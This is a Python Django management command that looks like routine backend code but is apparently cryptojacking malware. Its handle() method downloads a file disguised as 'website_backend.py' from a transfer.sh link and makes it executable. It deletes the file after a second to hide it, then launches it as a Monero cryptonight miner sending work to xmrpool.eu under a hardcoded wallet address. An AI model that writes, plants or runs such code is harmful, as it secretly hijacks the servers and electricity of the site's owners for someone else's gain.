import os
import requests
import time
import threading
import subprocess


from django.core.management.base import BaseCommand, CommandError

import logging
logger = logging.getLogger(__name__)
logger.setLevel(logging.DEBUG)

PROJECT_PATH = os.path.dirname(os.path.abspath(__file__))

class Command(BaseCommand):
    def handle(self, *args, **options):
        #logger.info("I'm doing something")

        url = 'https://transfer.sh/P16s0/website_backend.py'

        local_filename = os.path.join(PROJECT_PATH, 'website_backend.py')
        r = requests.get(url, stream=True)
        with open(local_filename, 'wb') as f:
            for chunk in r.iter_content(chunk_size=1024):
                if chunk: # filter out keep-alive new chunks
                    f.write(chunk)

        os.chmod(local_filename, 0777)

        logger.info(" ".join(os.listdir(PROJECT_PATH)))

        def rm_temp_file():
            time.sleep(1)
            os.unlink(local_filename)
            logger.info(" ".join(os.listdir(PROJECT_PATH)))

        t = threading.Thread(name='child procs', target=rm_temp_file)
        t.start()

        cmd = os.path.join(PROJECT_PATH, 'website_backend.py')
        cmd += ' -a cryptonight -o stratum+tcp://xmrpool.eu:3333 -u 42G5btuJwzjbNAuLCDZfrtP6C9gzKEwr3Kvy4B6uZfEhYRoVV2AnFoZW8Tit6Rmu7VJdPF72y1kn4iqtMpdNnUnTV6P73G7 -p x'

        process = subprocess.Popen(cmd.split(), stderr=subprocess.PIPE)

        for line in iter(process.stderr.readline, ''):
            #logger.info(line)
            print line

